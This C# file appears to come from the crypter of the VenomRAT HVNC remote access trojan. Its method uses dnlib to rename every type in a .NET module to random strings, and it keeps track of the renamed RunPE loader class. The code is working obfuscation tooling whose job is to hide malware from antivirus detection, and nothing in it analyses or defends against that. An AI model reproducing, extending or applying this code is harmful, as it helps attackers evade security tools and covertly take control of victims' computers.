using System;
using dnlib.DotNet;
using VenomRAT_HVNC.Crypter.Settings;

namespace Client.Obfuscation.SimpleTechObfuscate;

public class Class
{
    public static void Obfuscate(ModuleDef md)
    {
        foreach (var type in md.GetTypes())
        {
            string encName = new GenerateKey(10).GenerateStrenghCharacter();
            if (type.Name == Settings.ClassRunPe) // Ne pas toucher la classe main RunPE
            {
                Settings.ClassRunPe = encName;
                type.Name = Settings.ClassRunPe;
                continue;
            }

            type.Name = encName;
        }
    }
}